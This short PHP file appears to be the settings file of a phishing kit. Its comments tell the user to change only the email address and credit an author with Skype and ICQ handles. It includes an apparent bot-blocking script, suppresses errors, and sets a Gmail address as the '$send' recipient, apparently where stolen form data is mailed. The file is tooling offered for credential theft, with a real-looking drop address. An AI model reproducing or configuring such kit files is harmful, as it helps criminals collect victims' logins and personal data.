<?php
// Just Change to your Email
// THIS SCRIPT CODED BY Ghost
// CONTACT US SKYPE : Buster
// ICQ : ?????????

include('blocker.php');
error_reporting(0);
$send   = "za438670@gmail.com";

?>